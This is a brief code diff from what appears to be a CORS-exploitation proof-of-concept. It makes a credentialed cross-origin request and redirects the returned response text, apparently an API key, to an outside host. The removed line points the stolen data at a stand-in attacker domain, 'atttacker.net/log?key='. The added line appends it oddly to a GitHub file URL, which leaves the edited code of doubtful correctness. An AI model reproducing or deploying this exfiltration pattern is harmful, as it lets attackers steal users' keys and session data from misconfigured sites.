@@ -5,5 +5,5 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='https://github.com/zimshk/cors/blob/main/nice.js'+this.responseText; 
 };
